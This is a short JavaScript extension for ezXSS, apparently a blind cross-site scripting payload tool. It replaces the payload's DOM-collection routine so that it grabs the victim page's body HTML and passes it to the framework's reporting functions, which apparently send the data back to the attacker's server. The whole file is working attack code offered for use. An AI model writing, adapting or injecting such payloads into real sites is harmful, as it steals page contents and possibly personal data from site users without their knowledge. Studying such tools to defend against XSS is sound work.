// <ezXSS extension>
// @name              Custom DOM Collector
// @description       Collects only the body HTML instead of the full document
// @author            ssl
// @version           1.0
// </ezXSS extension>

function ez_hL() {
    // Override the default ez_hL function
    try {
        ez_rD.dom = ez_n(document.body.outerHTML);
    } catch (e) {
        ez_rD.dom = "";
    }
    // Call other necessary functions
    ez_s();
    ez_nW();
    ez_cb(ez_rD, ez_dr2);
    ez_cp();
    ez_p();
}